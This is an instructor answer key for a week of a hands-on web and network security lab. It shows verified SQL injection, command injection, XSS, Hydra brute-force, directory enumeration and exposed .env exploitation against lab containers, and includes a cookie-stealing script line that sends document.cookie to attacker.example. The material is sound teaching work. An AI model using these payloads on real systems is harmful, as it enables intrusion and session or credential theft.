# Week 7 Worksheet Walkthrough — INSTRUCTOR ONLY

> Verified against live containers. Do not distribute to students before the
> end of the session.

---

## Exercise 1: SQL Injection — DVWA

```
1' OR '1'='1
1' UNION SELECT user, password FROM users-- -
```

**Verified result:**
- `1' OR '1'='1` returns **every row in the table** (all 5 DVWA users:
  admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) instead of just
  ID 1.
- `1' UNION SELECT user, password FROM users-- -` returns all usernames
  and their MD5 password hashes, e.g. `admin` /
  `5f4dcc3b5aa765d61d8327deb882cf99` (that's `md5("password")` — matches
  Week 6's own hash exercises), `gordonb` / `e99a18c428cb38d5f260853678922e03`,
  `1337` / `8d3533d75ae2c3966d7e0d4fcc69216b`, `pablo` /
  `0d107d09f5bbe40cade3de5c71e9e9b7`, `smithy` /
  `5f4dcc3b5aa765d61d8327deb882cf99`.

**Question — why did `'1'='1'` bypass the logic?** The application
concatenates user input directly into the SQL query string instead of
using parameterised queries/prepared statements. The literal query becomes
something like `... WHERE user_id = '1' OR '1'='1'`, and since `'1'='1'`
is always true, the `WHERE` clause matches every row regardless of the
original `user_id` filter. This is the textbook signature of unsanitised
string concatenation building a query from untrusted input.

---

## Exercise 2: Command Injection — DVWA

```
127.0.0.1
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
```

**Verified result:**
- `127.0.0.1` → normal ping output (4 packets, 0% loss).
- `127.0.0.1; whoami` → ping output **followed by** `www-data` — the
  semicolon chains a second, completely separate shell command onto the
  application's own `ping` call.
- `127.0.0.1; cat /etc/passwd` → ping output followed by the full contents
  of `/etc/passwd` (root, daemon, bin, sys, ... down to the container's
  users).

This confirms the application passes user input straight into a shell
command (e.g. `system("ping " . $_POST['ip'])`) with no input validation or
allow-listing at all.

---

## Exercise 3: Cross-Site Scripting (XSS) — DVWA

```
<script>alert('XSS Found!');</script>
```

**Verified result:** confirmed via direct HTTP request that the payload is
reflected back into the page **completely unescaped** — the literal
`<script>...</script>` tag appears in the HTML response, not an
HTML-entity-encoded version (`&lt;script&gt;`). In a real browser this
executes immediately, producing the alert box.

**Did the alert box pop up?** **Yes.**

**Question — turning this into cookie/session theft against another
user?** Instead of `alert()`, inject something like
`<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>`
(or an `<img src=x onerror=...>` variant) and get a victim to load the
crafted URL — e.g. via a phishing link or a stored/persistent version of
the same flaw. Their browser runs the script in the context of *their*
already-logged-in session and sends *their* session cookie to the
attacker's server, letting the attacker hijack that session without ever
knowing the victim's password.

---

## Exercise 4: Broken Authentication — Hydra Brute Force

**Step 1 — session cookie:** obtained by logging into DVWA via a scripted
`curl` login (CSRF token extracted from the login page, then POSTed) rather
than a browser — same effect as copying `PHPSESSID` from DevTools, just
automated for verification. Confirmed cookies after login:
`PHPSESSID=<session>`, `security=low`.

```bash
echo "letmein" > /tmp/passwords.txt
echo "123456" >> /tmp/passwords.txt
echo "password" >> /tmp/passwords.txt
echo "admin" >> /tmp/passwords.txt

hydra -l admin -P /tmp/passwords.txt 10.10.7.12 http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:G=1:H=Cookie\: PHPSESSID=<PHPSESSID>; security=low:F=incorrect"
```

**Verified result:**
```
[80][http-get-form] host: 10.10.7.12  login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

**Which password did Hydra find?** `password`.

**Question — what made this attack possible at all (vs. `login.php`)?**
The Brute Force module has **no CSRF token** protecting its requests. Every
attempt is a plain, stateless GET with `username`/`password` in the query
string, so Hydra can fire requests in rapid succession without needing to
fetch and parse a fresh anti-CSRF token before each one (which would make
naive brute-forcing far harder). It also has no rate limiting or account
lockout, so nothing stops a fast, automated guessing loop.

---

## Exercise 5: Directory Enumeration — Juice Shop

```bash
gobuster dir -u http://10.10.7.11:3000 -w /usr/share/wordlists/dirb/common.txt \
  -t 20 --exclude-length 9393
```

**Verified result:** confirmed the SPA's fallback/404 page is exactly
**9393 bytes**, matching the worksheet's `--exclude-length` value. Real
directories found:

```
api           (Status: 500) [Size: 2408]
assets        (Status: 301) → /assets/
ftp           (Status: 200) [Size: 11307]
media         (Status: 301) → /media/
promotion     (Status: 200) [Size: 5863]
robots.txt    (Status: 200) [Size: 28]
rest          (Status: 500) [Size: 2410]
```

`/ftp/` is the standout finding — it returns a real, browsable directory
listing (`listing directory /ftp/`), which is Juice Shop's well-known
legacy-backup/file-disclosure challenge area.

**What real directory did you find?** `/ftp` (a genuine directory listing,
not the SPA fallback) — also `/assets`, `/media`, `/api`, `/robots.txt`.

**Question — why does directory enumeration still matter against an
SPA?** Client-side routing only covers the app's own UI routes. The actual
web server underneath still serves real files and API/backend endpoints
(`/api`, `/rest`, `/assets`, and here, a legacy `/ftp` directory) that exist
independently of the JavaScript router and were never meant to be
user-facing — enumeration finds exactly the kind of forgotten backend
surface that a UI-only review would miss entirely.

---

## Exercise 6: Sensitive Data Exposure — Exposed `.env` File

```bash
curl http://10.10.7.12/.env
```

**Verified result:**
```
DB_HOST=127.0.0.1
DB_NAME=dvwa
DB_USER=app
DB_PASSWORD=devP@ssw0rd!
MAIL_HOST=smtp.example.local
MAIL_USER=notifications@example.local
MAIL_PASSWORD=SuperSecretMail123
API_KEY=FAKE-DEMO-API-KEY-DO-NOT-USE-1234567890
```
(All fake/lab values, deliberately labelled as such in the file itself.)

**What secrets did you find?** Database credentials, mail server
credentials, and an API key — a complete secondary attack surface (mail
server, another database) exposed from a single guessed filename.

**Question — what to check for next on a real engagement?** Other
common predictable filenames at the same web root (`.git/config`,
`config.php.bak`, `backup.sql`, `.htpasswd`, `wp-config.php.bak`, etc.) —
if one well-known sensitive filename was left exposed, it's a strong signal
the same deployment process may have left others, so a targeted check
(not a full brute force) of common backup/config filenames is a natural
next step.

---

## Exercise 7: MySQL Enumeration

```bash
mysql -h 10.10.7.9 -u user -puserpassword --skip-ssl exampledb
SHOW TABLES;
DESCRIBE employees;
SELECT * FROM employees;
```

**Verified result:** `exampledb` contains `ctf_flags` (optional CTF, not
queried here), `employees`, and `helpdesk_tickets`. `employees` schema:
`id`, `username`, `department`, `email`. Data:

| username | department | email |
|----------|-----------|-------|
| rlopez | IT | rlopez@example.local |
| kchen | Finance | kchen@example.local |
| dnguyen | HR | dnguyen@example.local |
| smartin | Engineering | smartin@example.local |

(`helpdesk_tickets` also exists and is worth a look beyond the worksheet's
explicit instructions — it's part of this lab's optional CTF path.)

---

## Exercise 8: Telnet Analysis

```bash
telnet 10.10.7.10
# Login: student / capture123
```

**Verified: login succeeds** — `student`/`capture123` grants a working
shell (`Welcome to Alpine!`).

> **⚠️ Instructor note — this used to be a two-part trap; both parts are
> now fixed.** Per the same Docker-bridge behaviour already noted in the
> Week 1/Week 3 walkthroughs, a bridge network only delivers traffic to/from
> a container's **own** interface — it behaves like a switch, not a hub. If
> a student runs `telnet` from `week7-attacker` (10.10.7.13), the Wireshark
> box (10.10.7.2) **will not see that traffic at all**, and the capture will
> be empty. The worksheet now explicitly tells students to run `telnet` from
> inside the `week7-wireshark` container's own noVNC desktop
> (`http://localhost:3000`), same pattern as Week 1/3.
>
> Separately, the `linuxserver/wireshark` image ships with no telnet client
> by default (`which telnet` returns nothing). This is now baked into the
> compose setup itself: `wireshark-init/10-install-telnet.sh` is mounted to
> `/custom-cont-init.d` and runs `apk add --no-cache busybox-extras`
> automatically on every container start, so students hit a working
> `telnet` command with no manual install step. Confirmed via a scripted
> `tshark`-based capture from that container: the TCP stream shows the
> login prompt, then `student` and `capture123` both fully in the clear —
> exactly the point of the exercise.

**Follow → TCP Stream confirms** (verified via `tshark -z follow,tcp,ascii`
in place of the GUI click-path): the login prompt, then `student` on its
own line, then `Password:` followed by `capture123` — both fully readable,
proving Telnet's complete lack of encryption.

---

## Exercise 9: LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.10.7.7 -b "dc=example,dc=org" -D "cn=admin,dc=example,dc=org" -w admin
```

**Verified result:** authenticates successfully but returns only the base
organisation entry (`dc=example,dc=org`, `o: Example Organization`) — no
populated user/people branch exists in this directory (same pattern as
Week 5's LDAP server: the directory itself is intentionally sparse, the
exercise is about the mechanics of an authenticated bind and search, not
about a large realistic dataset here).

---

## Notes for the Instructor

- **Exercise 8 used to have a silent-failure trap; both causes are now
  fixed.** The worksheet now tells students explicitly to run `telnet` from
  inside `week7-wireshark`'s own desktop (running it from the attacker
  container instead gives a completely empty, error-free capture, since the
  Docker bridge only delivers traffic to a container's own interface). The
  Wireshark image's missing telnet client is now installed automatically at
  container start via `wireshark-init/10-install-telnet.sh`, so there's no
  manual `apk add` step left for students to miss.
- Exercise 4's session-cookie step is the fiddliest part of this worksheet
  for students — reinforce that both `PHPSESSID` *and* `security=low` need
  to be sent together in the `H=Cookie:` header, or DVWA's security-level
  check will reject/behave differently.
- LDAP (Exercise 9) and MySQL's `helpdesk_tickets` table are both sparser/
  richer than what the worksheet explicitly asks students to look at —
  worth a quick mention that real enumeration means checking beyond the
  exact fields a worksheet lists.
